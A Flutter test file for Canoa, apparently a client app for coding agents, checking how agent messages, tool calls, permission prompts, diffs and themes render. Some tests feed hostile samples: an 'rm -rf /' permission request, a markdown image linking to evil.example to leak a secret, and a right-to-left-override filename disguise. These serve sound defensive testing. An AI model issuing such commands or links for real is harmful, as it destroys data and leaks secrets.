// What an agent sends, shaped as a real one sends it, through the store and into the conversation, in every look.
import 'dart:async';
import 'dart:convert';
import 'dart:io' show Directory, File;

import 'package:canoa/acp/client.dart';
import 'package:canoa/chat/agent_events.dart';
import 'package:canoa/chat/diff.dart';
import 'package:canoa/chat/transcript.dart';
import 'package:canoa/chat/update_record.dart';
import 'package:canoa/config/canoa_config.dart';
import 'package:canoa/config/settings_dialog.dart';
import 'package:canoa/main.dart';
import 'package:canoa/session_store.dart';
import 'package:canoa/theme/look.dart';
import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';

/// Text is drawn a little differently on each platform, by a fraction of a percent here, and a broken layout moves far more than that.
final class _PlatformTolerant extends LocalFileComparator {
  _PlatformTolerant(super.testFile);

  static const double tolerated = 0.015;

  @override
  Future<bool> compare(Uint8List imageBytes, Uri golden) async {
    final result = await GoldenFileComparator.compareLists(imageBytes, await getGoldenBytes(golden));
    if (!result.passed && result.diffPercent > tolerated) {
      fail(await generateFailureOutput(result, golden, basedir));
    }
    result.dispose();
    return true;
  }
}

/// The agent's end of a connection, in memory.
final class FakeAgent {
  final incoming = StreamController<String>();
  final sent = <Map<String, dynamic>>[];
  late final VerifiedAgent client;

  Future<ChatSession> start(SessionStore store) async {
    client = VerifiedAgent.fromChild(
      label: 'Fake',
      messages: incoming.stream,
      decider: store.askPermission,
      close: () async {},
      send: (line) async {
        final message = jsonDecode(line) as Map<String, dynamic>;
        sent.add(message);
        if (message['method'] == 'initialize') {
          reply(message['id'], {'protocolVersion': 1, 'agentCapabilities': <String, Object?>{}});
        } else if (message['method'] == 'session/new') {
          reply(message['id'], {'sessionId': 's1'});
        } else if (message['method'] == 'session/set_config_option') {
          reply(message['id'], {'configOptions': <Object>[]});
        } else if (message['id'] != null && message['method'] != 'session/prompt') {
          reply(message['id'], <String, Object?>{});
        }
      },
    );
    await client.initialize();
    // The client takes only the traffic of sessions it opened.
    final opened = await client.openSession(cwd: '/work');
    final session = store.addProviderSession(title: 'Fake', agent: 'Fake', peerId: client.peerId, remoteSessionId: opened.id);
    store.attachVerifiedClient(session.id, client);
    store.select(session.id);
    return session;
  }

  void reply(Object? id, Object? result) => incoming.add(jsonEncode({'jsonrpc': '2.0', 'id': id, 'result': result}));

  void update(Map<String, Object?> body) => incoming.add(jsonEncode({
    'jsonrpc': '2.0',
    'method': 'session/update',
    'params': {'sessionId': 's1', 'update': body},
  }));

  /// A turn with one of everything, as a real agent's shapes go.
  void everything() {
    update({'sessionUpdate': 'agent_thought_chunk', 'content': {'type': 'text', 'text': 'working it out'}});
    update({'sessionUpdate': 'agent_message_chunk', 'messageId': 'm1', 'content': {'type': 'text', 'text': 'Here is **bold** and `code`.'}});
    update({'sessionUpdate': 'plan', 'entries': [
      {'content': 'Read the file', 'status': 'completed', 'priority': 'high'},
      {'content': 'Change it', 'status': 'in_progress', 'priority': 'high'},
    ]});
    update({'sessionUpdate': 'tool_call_update', 'toolCallId': 't1', 'name': 'Bash', 'rawInput': <String, Object?>{}, 'status': 'pending', 'title': 'Run a command', 'kind': 'execute', 'locations': <Object>[], 'content': [{'type': 'terminal', 'terminalId': 'term1'}]});
    update({'sessionUpdate': 'terminal_update', 'terminalId': 'term1', 'command': 'echo hi'});
    update({'sessionUpdate': 'terminal_update', 'terminalId': 'term1', 'output': {'data': base64Encode(utf8.encode('hi\n'))}});
    update({'sessionUpdate': 'terminal_update', 'terminalId': 'term1', 'exitStatus': {'exitCode': 3}});
    update({'sessionUpdate': 'tool_call_update', 'toolCallId': 't1', 'status': 'failed', 'rawOutput': 'no'});
    update({'sessionUpdate': 'tool_call_update', 'toolCallId': 't2', 'title': 'Edit hello.txt', 'kind': 'edit', 'status': 'completed', 'locations': [{'path': 'hello.txt', 'line': 4}], 'content': [{'type': 'diff', 'path': 'hello.txt', 'oldText': 'hello\n', 'newText': 'bye\n'}]});
    update({'sessionUpdate': 'tool_call_update', 'toolCallId': 't3', 'title': 'Patch', 'status': 'completed', 'content': [{'type': 'patch', 'changes': <Object>[], 'patch': {'format': 'unified', 'text': '@@ -1 +1 @@\n-gone\n+arrived'}}]});
    update({'sessionUpdate': 'usage_update', 'used': 500, 'size': 1000, 'cost': {'amount': 0.25, 'currency': 'USD'}});
    update({'sessionUpdate': 'available_commands_update', 'availableCommands': [
      {'type': 'text', 'name': 'review', 'description': 'Review the change'},
      {'type': 'text', 'name': 'compact', 'description': 'Make room'},
    ]});
    update({'sessionUpdate': 'config_option_update', 'configOptions': [
      {'configId': 'model', 'name': 'Model', 'category': 'model', 'type': 'select', 'currentValue': 'a', 'options': [
        {'value': 'a', 'name': 'Model A'},
        {'value': 'b', 'name': 'Model B'},
      ]},
    ]});
  }
}

Future<(FakeAgent, ChatSession, SessionStore)> _fed(WidgetTester tester, {UpdateRecorder? recorder}) async {
  final store = SessionStore(includePreview: false, recorder: recorder);
  final agent = FakeAgent();
  final session = await tester.runAsync(() => agent.start(store)) as ChatSession;
  return (agent, session, store);
}

Future<void> _settle(WidgetTester tester) async {
  await tester.runAsync(() => Future<void>.delayed(const Duration(milliseconds: 20)));
  await tester.pump();
}

Future<void> _openAll(WidgetTester tester, Finder titles) async {
  for (final title in titles.evaluate().toList()) {
    await tester.tap(find.byWidget(title.widget), warnIfMissed: false);
    await tester.pumpAndSettle();
  }
}

void main() {
  setUpAll(() {
    goldenFileComparator = _PlatformTolerant(Uri.file('${Directory.current.path}/test/chat_test.dart'));
  });

  group('what an agent sends', () {
    testWidgets('every kind a real agent sent has a rendering', (tester) async {
      await tester.binding.setSurfaceSize(const Size(1200, 2200));
      addTearDown(() => tester.binding.setSurfaceSize(null));
      final (agent, session, store) = await _fed(tester);
      await tester.pumpWidget(CanoaApp(store: store));
      agent.everything();
      await _settle(tester);

      expect(find.text('Thinking'), findsOneWidget);
      expect(find.byType(AgentMarkdown), findsOneWidget);
      expect(find.text('Run a command'), findsOneWidget);
      expect(find.text('Edit hello.txt'), findsOneWidget);
      expect(find.text('Plan: 1 of 2'), findsOneWidget);
      expect(find.text('50% of context · 0.25 USD'), findsOneWidget);
      expect(find.text('Model A'), findsOneWidget);
      // A failure opens by itself: its command, output and exit status are what a person came to see.
      expect(find.text(r'$ echo hi'), findsOneWidget);
      expect(find.text('exit 3'), findsOneWidget);

      await tester.tap(find.text('Edit hello.txt'));
      await tester.pumpAndSettle();
      expect(find.text('- hello'), findsOneWidget);
      expect(find.text('+ bye'), findsOneWidget);
      expect(find.text('hello.txt:4'), findsOneWidget);
      await tester.tap(find.text('Patch'));
      await tester.pumpAndSettle();
      expect(find.text('- gone'), findsOneWidget);
      expect(find.text('+ arrived'), findsOneWidget);

      await tester.tap(find.text('Thinking'));
      await tester.pumpAndSettle();
      expect(find.text('working it out'), findsOneWidget);
      expect(session.messages.where((message) => message.role == MessageRole.tool), hasLength(3));
    });

    testWidgets('updates to one tool build one card, and leave what they do not mention', (tester) async {
      final (agent, session, _) = await _fed(tester);
      agent.update({'sessionUpdate': 'tool_call', 'toolCallId': 't', 'title': 'First', 'kind': 'read', 'status': 'pending'});
      agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 't', 'status': 'in_progress'});
      agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 't', 'content': [{'type': 'content', 'content': {'type': 'text', 'text': 'out'}}]});
      agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 't', 'content': <Object>[]});
      await _settle(tester);
      expect(session.messages, hasLength(1));
      final tool = session.messages.single.tool!;
      expect(tool.title, 'First');
      expect(tool.kind, 'read');
      expect(tool.status, ToolStatus.running);
      expect((tool.blocks.single as ToolText).text, 'out');
    });

    testWidgets('choosing goes to the agent, and a slash shows its commands without running one', (tester) async {
      await tester.binding.setSurfaceSize(const Size(1000, 1000));
      addTearDown(() => tester.binding.setSurfaceSize(null));
      final (agent, session, store) = await _fed(tester);
      await tester.pumpWidget(CanoaApp(store: store));
      agent.everything();
      await _settle(tester);

      await tester.tap(find.text('Model A'));
      await tester.pumpAndSettle();
      await tester.tap(find.text('Model B').last);
      await tester.pumpAndSettle();
      await _settle(tester);
      final chose = agent.sent.singleWhere((message) => message['method'] == 'session/set_config_option');
      expect(chose['params'], {'sessionId': 's1', 'configId': 'model', 'value': 'b'});
      expect(session.options.single.current, 'b');

      await tester.enterText(find.byType(TextField), '/re');
      await tester.pump();
      expect(find.text('/review'), findsOneWidget);
      expect(find.text('/compact'), findsNothing);
      await tester.tap(find.text('/review'));
      await tester.pump();
      expect(find.widgetWithText(TextField, '/review '), findsOneWidget);
      expect(agent.sent.where((message) => message['method'] == 'session/prompt'), isEmpty);
    });

    testWidgets('a v2 request shows in the conversation, with what it would do, and an answer reaches the agent', (tester) async {
      await tester.binding.setSurfaceSize(const Size(1000, 1000));
      addTearDown(() => tester.binding.setSurfaceSize(null));
      final (agent, session, store) = await _fed(tester);
      await tester.pumpWidget(CanoaApp(store: store));
      agent.incoming.add(jsonEncode({
        'jsonrpc': '2.0', 'id': 88, 'method': 'session/request_permission',
        'params': {
          'sessionId': 's1',
          'title': 'Write to hello.txt',
          'subject': {'type': 'tool_call', 'toolCall': {'toolCallId': 'w1', 'title': 'Write', 'kind': 'edit', 'rawInput': {'file_path': 'hello.txt'}}},
          'options': [{'optionId': 'no', 'name': 'No', 'kind': 'reject_once'}, {'optionId': 'yes', 'name': 'Yes', 'kind': 'allow_once'}],
        },
      }));
      await _settle(tester);
      expect(find.text('Write to hello.txt'), findsOneWidget);
      expect(find.text('hello.txt'), findsOneWidget);
      expect(session.toolEntries['w1']?.tool?.title, 'Write', reason: 'the subject is applied before the prompt shows');
      await tester.tap(find.text('Refuse'));
      await _settle(tester);
      expect(agent.sent.singleWhere((message) => message['id'] == 88)['result'], {'outcome': {'outcome': 'selected', 'optionId': 'no'}});
    });

    testWidgets('Stop cancels, and a question still open is answered cancelled', (tester) async {
      await tester.binding.setSurfaceSize(const Size(1000, 1000));
      addTearDown(() => tester.binding.setSurfaceSize(null));
      final (agent, session, store) = await _fed(tester);
      await tester.pumpWidget(CanoaApp(store: store));
      await tester.runAsync(() async {
        unawaited(store.sendText('go'));
        await Future<void>.delayed(const Duration(milliseconds: 20));
      });
      await tester.pump();
      expect(find.byTooltip('Send'), findsNothing);
      agent.incoming.add(jsonEncode({
        'jsonrpc': '2.0', 'id': 77, 'method': 'session/request_permission',
        'params': {
          'sessionId': 's1',
          'toolCall': {'toolCallId': 't', 'title': 'Delete everything', 'rawInput': {'command': 'rm -rf /'}},
          'options': [{'optionId': 'no', 'kind': 'reject_once'}, {'optionId': 'yes', 'kind': 'allow_once'}],
        },
      }));
      await _settle(tester);
      expect(find.text('Delete everything'), findsNWidgets(2), reason: 'the question, and the tool it is about');
      expect(find.text('rm -rf /'), findsOneWidget, reason: 'a person sees what they would be allowing');

      await tester.tap(find.byTooltip('Stop'));
      await _settle(tester);
      expect(session.pendingPermissions, isEmpty);
      final answer = agent.sent.singleWhere((message) => message['id'] == 77);
      expect(answer['result'], {'outcome': {'outcome': 'cancelled'}});
      expect(agent.sent.where((message) => message['method'] == 'session/cancel'), hasLength(1));
      agent.reply(agent.sent.firstWhere((message) => message['method'] == 'session/prompt')['id'], {'stopReason': 'cancelled'});
      await _settle(tester);
      expect(session.status, SessionStatus.connected, reason: 'a cancelled turn has ended');
      expect(find.byTooltip('Send'), findsOneWidget);
      expect(session.messages.last.text, 'Stopped.');
    });

    testWidgets('a question the client could not read is said, and the turn goes on', (tester) async {
      final (agent, session, store) = await _fed(tester);
      await tester.runAsync(() async {
        unawaited(store.sendText('go'));
        await Future<void>.delayed(const Duration(milliseconds: 20));
      });
      agent.incoming.add(jsonEncode({'jsonrpc': '2.0', 'id': 66, 'method': 'session/request_permission', 'params': {'sessionId': 's1'}}));
      await _settle(tester);
      expect(agent.sent.singleWhere((message) => message['id'] == 66)['result'], {'outcome': {'outcome': 'cancelled'}});
      expect(session.status, SessionStatus.working, reason: 'only the agent ends its turn');
      expect(session.messages.last.role, MessageRole.notice);
      expect(session.messages.last.text, contains('cannot read'));
    });

    testWidgets('a tool cancelled by a stop says so, rather than waiting for ever', (tester) async {
      await tester.binding.setSurfaceSize(const Size(1000, 1000));
      addTearDown(() => tester.binding.setSurfaceSize(null));
      final (agent, _, store) = await _fed(tester);
      await tester.pumpWidget(CanoaApp(store: store));
      agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 'e', 'title': 'Edit src/calc.js', 'kind': 'edit', 'status': 'pending'});
      agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 'e', 'status': 'cancelled'});
      await _settle(tester);
      expect(find.byTooltip('cancelled'), findsOneWidget);
      expect(find.byTooltip('waiting'), findsNothing);
    });

    testWidgets('terminal output is decoded from base64: a snapshot replaces it, and a chunk adds to it', (tester) async {
      final (agent, session, _) = await _fed(tester);
      String bytes(String text) => base64Encode(utf8.encode(text));
      agent.update({'sessionUpdate': 'terminal_update', 'terminalId': 't', 'output': {'data': bytes('Exit code 2\n')}});
      agent.update({'sessionUpdate': 'terminal_update', 'terminalId': 't', 'output': {'data': bytes('one\n')}});
      agent.update({'sessionUpdate': 'terminal_output_chunk', 'terminalId': 't', 'data': bytes('two ✓\n')});
      await _settle(tester);
      expect(session.terminals['t']!.output, 'one\ntwo ✓\n');
    });

    testWidgets('output a bridge dropped while nobody was connected is said in the conversation', (tester) async {
      final (agent, session, _) = await _fed(tester);
      agent.update({'sessionUpdate': 'agent_message_chunk', 'messageId': 'm1', 'content': {'type': 'text', 'text': 'before'}});
      agent.incoming.add(jsonEncode({
        'jsonrpc': '2.0',
        'method': acpOutputLost,
        'params': {'lines': 3, 'bytes': 2048},
      }));
      await _settle(tester);
      expect(session.messages.last.role, MessageRole.notice);
      expect(session.messages.last.text, contains('3 messages'));
    });
  });

  group('an agent is not trusted', () {
    testWidgets('an image is not fetched, and a link is copied rather than opened', (tester) async {
      String? copied;
      tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, (call) async {
        if (call.method == 'Clipboard.setData') copied = (call.arguments as Map)['text'] as String?;
        return null;
      });
      await tester.pumpWidget(MaterialApp(
        theme: themeFor(LookId.bubbles, Brightness.dark),
        home: const Scaffold(body: AgentMarkdown(text: '![the secret](https://evil.example/?d=secret) [a link](https://example.org/x)')),
      ));
      await tester.pump();
      expect(find.byType(Image), findsNothing);
      expect(find.textContaining('[image: the secret]'), findsOneWidget);
      // What a tap on the link runs: the framework's own text-range tap cannot find selectable text here.
      TapGestureRecognizer? link;
      for (final text in tester.widgetList<SelectableText>(find.byType(SelectableText))) {
        text.textSpan?.visitChildren((span) {
          if (span is TextSpan && span.recognizer is TapGestureRecognizer) link = span.recognizer! as TapGestureRecognizer;
          return true;
        });
      }
      link!.onTap!();
      await tester.pump();
      expect(copied, 'https://example.org/x');
    });

    testWidgets('wrong types are ignored rather than trusted', (tester) async {
      final (agent, session, _) = await _fed(tester);
      for (final body in <Map<String, Object?>>[
        {'sessionUpdate': 'tool_call_update'},
        {'sessionUpdate': 'tool_call_update', 'toolCallId': 7},
        {'sessionUpdate': 'terminal_update', 'terminalId': 7},
        {'sessionUpdate': 'plan', 'entries': 'nope'},
        {'sessionUpdate': 'available_commands_update', 'availableCommands': 7},
        {'sessionUpdate': 'usage_update', 'used': 'many', 'cost': 'lots'},
        {'sessionUpdate': 'config_option_update', 'configOptions': [{'id': 'm', 'currentValue': 'not offered', 'options': [{'value': 'a'}]}]},
        {'sessionUpdate': 'session_info_update', 'title': 7},
        {'sessionUpdate': 'something_new', 'whatever': true},
      ]) {
        agent.update(body);
      }
      agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 'ok', 'title': 7, 'status': 'nonsense', 'locations': 'x', 'content': [7, {'type': 'terminal', 'terminalId': 7}]});
      await _settle(tester);
      expect(session.messages, hasLength(1));
      final tool = session.messages.single.tool!;
      expect(tool.title, 'A tool');
      expect(tool.status, ToolStatus.pending);
      expect(tool.blocks, isEmpty);
      expect(session.plan, isEmpty);
      expect(session.options, isEmpty);
      expect(session.usage.describe(), isNull);
    });

    testWidgets('names lose what could disguise them, and nothing grows without limit', (tester) async {
      final (agent, session, _) = await _fed(tester);
      agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 'a', 'title': 'safe\u202Etxt.exe\nsecond line'});
      final huge = 'x' * (maxMessageText + 10);
      agent.update({'sessionUpdate': 'agent_message_chunk', 'messageId': 'big', 'content': {'type': 'text', 'text': huge}});
      agent.update({'sessionUpdate': 'terminal_update', 'terminalId': 't', 'output': {'data': base64Encode(utf8.encode('y' * (maxTerminalOutput * 2)))}});
      for (var i = 0; i < 20; i++) {
        agent.update({'sessionUpdate': 'terminal_output_chunk', 'terminalId': 't', 'data': base64Encode(utf8.encode('z' * 1024))});
      }
      await _settle(tester);
      expect(session.messages.first.tool!.title, 'safe txt.exe second line');
      expect(session.messages[1].text.length, lessThan(maxMessageText + 8));
      expect(session.terminals['t']!.output.length, maxTerminalOutput);
      expect(session.terminals['t']!.output.endsWith('z'), isTrue, reason: 'the end is where a failure says why');

      for (var i = 0; i < maxEntries + 50; i++) {
        agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 'n$i', 'title': 'x'});
      }
      await tester.runAsync(() => Future<void>.delayed(const Duration(milliseconds: 500)));
      expect(session.messages.length, lessThanOrEqualTo(maxEntries));
      expect(session.toolEntries.length, lessThanOrEqualTo(maxEntries));
    });

    testWidgets('an agent names a conversation only until a person has', (tester) async {
      final (agent, session, _) = await _fed(tester);
      agent.update({'sessionUpdate': 'session_info_update', 'title': 'From the agent'});
      await _settle(tester);
      expect(session.title, 'Fake', reason: 'a person named this one');
      session.agentNames = true;
      agent.update({'sessionUpdate': 'session_info_update', 'title': 'From the agent'});
      await _settle(tester);
      expect(session.title, 'From the agent');
    });
  });

  group('diffs', () {
    String shown(String? before, String after) => diffLines(before, after)
        .map((line) => '${switch (line.kind) { DiffKind.added => '+', DiffKind.removed => '-', DiffKind.same => ' ' }}${line.text}')
        .join('|');

    test('a change, a new file, an emptied file, and no change', () {
      expect(shown('a\nb\nc', 'a\nx\nc'), ' a|-b|+x| c');
      expect(shown(null, 'a\nb'), '+a|+b');
      expect(shown('a\nb', ''), '-a|-b');
      expect(shown('a\nb', 'a\nb'), ' a| b');
      expect(shown('a\nb\nc', 'b\nc\nd'), '-a| b| c|+d');
    });

    test('too large to compare is shown as old then new, without building the table', () {
      final before = List.generate(5000, (i) => 'old$i').join('\n');
      final after = List.generate(5000, (i) => 'new$i').join('\n');
      final watch = Stopwatch()..start();
      final lines = diffLines(before, after);
      expect(watch.elapsed, lessThan(const Duration(seconds: 1)));
      expect(lines.length, 10000);
      expect(lines.first.kind, DiffKind.removed);
      expect(lines.last.kind, DiffKind.added);
    });

    test('only the changes and what is around them', () {
      final before = List.generate(100, (i) => 'line$i').join('\n');
      final after = before.replaceFirst('line50', 'changed');
      final lines = withContext(diffLines(before, after), context: 2);
      expect(lines.first, isNull);
      expect(lines.last, isNull);
      expect(lines.whereType<DiffLine>().length, 6);
    });

    test('a unified patch reads as lines', () {
      final lines = patchLines('--- a\n+++ b\n@@ -1 +1 @@\n-gone\n+arrived\n kept');
      expect(lines[2], isNull);
      expect(lines.whereType<DiffLine>().where((line) => line.kind == DiffKind.added).single.text, 'arrived');
      expect(lines.whereType<DiffLine>().where((line) => line.kind == DiffKind.removed).single.text, 'gone');
    });
  });

  group('looks', () {
    test('Canoa.cfg keeps them, and refuses what it does not know', () {
      const chosen = CanoaConfig(look: LookId.terminal, brightness: 'light');
      final read = CanoaConfig.parse(chosen.encode());
      expect(read.look, LookId.terminal);
      expect(read.themeMode, ThemeMode.light);
      expect(const CanoaConfig().look, LookId.bubbles, reason: 'a file from before looks did not exist reads as it did');
      expect(CanoaConfig.parse('[desktop]\nstart_hidden = true\n').look, LookId.bubbles);
      expect(() => CanoaConfig.parse('[appearance]\nlook = "neon"\n'), throwsFormatException);
      expect(() => CanoaConfig.parse('[appearance]\nbrightness = "dim"\n'), throwsFormatException);
      expect(() => CanoaConfig.parse('[appearance]\nsomething = 1\n'), throwsFormatException);
    });

    testWidgets('the settings dialog chooses them', (tester) async {
      await tester.binding.setSurfaceSize(const Size(900, 1000));
      addTearDown(() => tester.binding.setSurfaceSize(null));
      CanoaConfig? saved;
      await tester.pumpWidget(MaterialApp(home: Builder(builder: (context) => TextButton(
        onPressed: () async => saved = await showDialog<CanoaConfig>(
          context: context,
          builder: (_) => const SettingsDialog(config: CanoaConfig()),
        ),
        child: const Text('open'),
      ))));
      await tester.tap(find.text('open'));
      await tester.pumpAndSettle();
      await tester.tap(find.text('Bubbles'));
      await tester.pumpAndSettle();
      await tester.tap(find.text('Terminal').last);
      await tester.pumpAndSettle();
      await tester.tap(find.text('Dark'));
      await tester.pumpAndSettle();
      await tester.tap(find.text('Light').last);
      await tester.pumpAndSettle();
      await tester.tap(find.text('Save'));
      await tester.pumpAndSettle();
      expect(saved?.look, LookId.terminal);
      expect(saved?.brightness, 'light');
    });

    testWidgets('switching is live and keeps the conversation', (tester) async {
      await tester.binding.setSurfaceSize(const Size(1200, 1400));
      addTearDown(() => tester.binding.setSurfaceSize(null));
      final (agent, session, store) = await _fed(tester);
      agent.everything();
      await _settle(tester);
      final entries = session.messages.length;
      for (final look in LookId.values) {
        for (final brightness in ['dark', 'light']) {
          await tester.pumpWidget(CanoaApp(key: const ValueKey('app'), store: store, config: CanoaConfig(look: look, brightness: brightness)));
          await tester.pumpAndSettle();
          expect(tester.takeException(), isNull);
          final context = tester.element(find.byType(TranscriptEntry).first);
          expect(context.look.id, look);
          expect(Theme.of(context).brightness, brightness == 'dark' ? Brightness.dark : Brightness.light);
          expect(session.messages.length, entries);
          expect(find.text('Edit hello.txt'), findsOneWidget);
        }
      }
    });

    for (final look in LookId.values) {
      for (final (label, size) in [('phone', const Size(390, 844)), ('desktop', const Size(1280, 800))]) {
        testWidgets('${look.name} draws at $label width with nothing overflowing', (tester) async {
          await tester.binding.setSurfaceSize(size);
          addTearDown(() => tester.binding.setSurfaceSize(null));
          final (agent, _, store) = await _fed(tester);
          await tester.pumpWidget(CanoaApp(store: store, config: CanoaConfig(look: look)));
          agent.everything();
          await _settle(tester);
          await _openAll(tester, find.text('Thinking'));
          await tester.pumpAndSettle();
          expect(tester.takeException(), isNull);
          await expectLater(find.byType(MaterialApp), matchesGoldenFile('goldens/${look.name}_$label.png'));
        });
      }
    }
  });

  group('a real coding task', () {
    // Each distinct kind and shape of update a real agent sent in integration_test/coding_task_test.dart, as the app recorded it.
    final fixture = [
      for (final line in File('test/fixtures/coding_task_updates.jsonl').readAsLinesSync())
        if (line.trim().isNotEmpty) jsonDecode(line) as Map<String, dynamic>,
    ];

    // A shape made an update again, with a stand-in for each value.
    Object? filled(Object? shape) => switch (shape) {
      'string' => 'x',
      'int' => 1,
      'double' => 0.5,
      'bool' => true,
      'null' => null,
      final Map<dynamic, dynamic> map => {for (final entry in map.entries) '${entry.key}': filled(entry.value)},
      final List<dynamic> list => [for (final item in list) filled(item)],
      _ => shape,
    };

    testWidgets('every update it sent has a rendering of its own, and draws', (tester) async {
      await tester.binding.setSurfaceSize(const Size(1280, 2000));
      addTearDown(() => tester.binding.setSurfaceSize(null));
      final recorder = UpdateRecorder();
      final (agent, _, store) = await _fed(tester, recorder: recorder);
      await tester.pumpWidget(CanoaApp(store: store));
      for (final seen in fixture) {
        agent.update(filled(seen['shape'])! as Map<String, Object?>);
      }
      await _settle(tester);
      expect(tester.takeException(), isNull);
      expect(recorder.seen.map((seen) => seen.kind).toSet(), {for (final seen in fixture) seen['kind']});
      expect(recorder.unshown, isEmpty, reason: 'these kinds reached the fallback, which shows nothing');
    });

    // Its kinds that the looks' goldens leave out: the person's message, the agent's name for the conversation, a turn waiting on
    // a question with Stop, a tool with text output, a cancelled one and a patch, as the real agent shaped them.
    for (final (label, size) in [('phone', const Size(390, 844)), ('desktop', const Size(1280, 800))]) {
      testWidgets('a turn waiting on a question draws at $label width with nothing overflowing', (tester) async {
        await tester.binding.setSurfaceSize(size);
        addTearDown(() => tester.binding.setSurfaceSize(null));
        final (agent, session, store) = await _fed(tester);
        session.agentNames = true;
        await tester.pumpWidget(CanoaApp(store: store));
        agent.update({'sessionUpdate': 'config_option_update', 'configOptions': [
          {'configId': 'mode', 'name': 'Mode', 'type': 'select', 'currentValue': 'ask', 'options': [
            {'value': 'ask', 'name': 'Ask first'},
            {'value': 'edits', 'name': 'Accept edits'},
          ]},
        ]});
        agent.update({'sessionUpdate': 'user_message', 'messageId': 'u1', 'content': [
          {'type': 'text', 'text': 'The test fails. Find out why and fix the code.'},
        ]});
        agent.update({'sessionUpdate': 'state_update', 'state': 'running'});
        agent.update({'sessionUpdate': 'session_info_update', 'title': 'Fix the failing test', 'updatedAt': '2026-11-03T00:00:00Z'});
        agent.update({'sessionUpdate': 'agent_message_chunk', 'messageId': 'a1', 'content': {'type': 'text', 'text': '`addNumbers` subtracts.'}});
        agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 'r', 'title': 'Read src/calc.js', 'kind': 'read', 'status': 'completed',
          'content': [{'type': 'content', 'content': {'type': 'text', 'text': 'export function addNumbers(a, b) {\n  return a - b;\n}'}}]});
        agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 'c', 'title': 'Edit README.md', 'kind': 'edit', 'status': 'cancelled'});
        agent.update({'sessionUpdate': 'tool_call_update', 'toolCallId': 'p', 'title': 'Edit src/calc.js', 'kind': 'edit', 'status': 'pending',
          'content': [{'type': 'diff', 'changes': [{'operation': 'update', 'path': 'src/calc.js', 'fileType': 'file'}],
            'patch': {'format': 'unified', 'text': '@@ -1,3 +1,3 @@\n export function addNumbers(a, b) {\n-  return a - b;\n+  return a + b;\n }'}}]});
        agent.update({'sessionUpdate': 'usage_update', 'used': 16000, 'size': 200000});
        agent.incoming.add(jsonEncode({
          'jsonrpc': '2.0', 'id': 91, 'method': 'session/request_permission',
          'params': {
            'sessionId': 's1',
            'title': 'Edit src/calc.js',
            'subject': {'type': 'tool_call', 'toolCall': {'toolCallId': 'p', 'rawInput': {'file_path': 'src/calc.js', 'old_string': 'a - b', 'new_string': 'a + b'}}},
            'options': [{'optionId': 'no', 'name': 'No', 'kind': 'reject_once'}, {'optionId': 'yes', 'name': 'Yes', 'kind': 'allow_once'}],
          },
        }));
        await _settle(tester);
        await tester.tap(find.text('Edit src/calc.js').first);
        await tester.pumpAndSettle();
        expect(tester.takeException(), isNull);
        expect(find.byTooltip('Stop'), findsOneWidget);
        expect(find.text('Allow'), findsOneWidget);
        expect(find.text('Fix the failing test'), findsWidgets);
        // At phone width the turn has scrolled past it.
        if (label == 'desktop') expect(find.byTooltip('cancelled'), findsOneWidget);
        await expectLater(find.byType(MaterialApp), matchesGoldenFile('goldens/coding_task_$label.png'));
      });
    }
  });
}
